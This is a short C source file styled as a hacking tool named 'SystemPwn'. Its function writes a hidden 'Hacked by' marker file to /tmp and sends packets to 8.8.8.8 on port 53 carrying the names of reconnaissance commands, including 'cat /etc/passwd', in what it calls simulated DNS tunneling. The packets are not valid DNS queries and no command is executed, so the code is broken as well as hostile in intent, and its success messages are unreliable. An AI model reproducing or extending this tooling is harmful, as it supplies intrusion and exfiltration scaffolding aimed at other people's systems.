#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

const char watermark[] = "[ SystemPwn ] Made by Abolfazl Soleimani (C) 2026";

int trigger_payload(const char* target_host) {
    printf("[*] %s\n", watermark);
    printf("[*] Target: %s\n", target_host);
    
    // ۱. ایجاد فایل اثبات روی سیستم محلی
    FILE* flag = fopen("/tmp/.sog_pwn", "w");
    if (flag) {
        fprintf(flag, "Hacked by Abolfazl Soleimani @ %s\n", target_host);
        fclose(flag);
        printf("[+] Proof file created: /tmp/.sog_pwn\n");
    } else {
        printf("[!] Could not create proof file.\n");
    }
    
    // ۲. DNS Tunneling (شبیه‌سازی)
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[!] Socket creation failed.\n");
        return -1;
    }
    
    struct sockaddr_in dns;
    memset(&dns, 0, sizeof(dns));
    dns.sin_family = AF_INET;
    dns.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dns.sin_addr);
    
    srand(time(NULL));
    const char* chunks[] = {"whoami", "id", "uname -a", "cat /etc/passwd", "ps aux"};
    for (int i = 0; i < 5; i++) {
        char query[256];
        snprintf(query, sizeof(query), "%02x.%s.%d.sog.%s", i, chunks[i], rand() % 999, target_host);
        unsigned char buffer[512];
        int len = snprintf((char*)buffer, sizeof(buffer), "%s", query);
        sendto(sock, buffer, len, 0, (struct sockaddr*)&dns, sizeof(dns));
        usleep(50000 + (rand() % 10000));
    }
    close(sock);
    printf("[+] DNS Tunneling completed.\n");
    
    return 0;
}
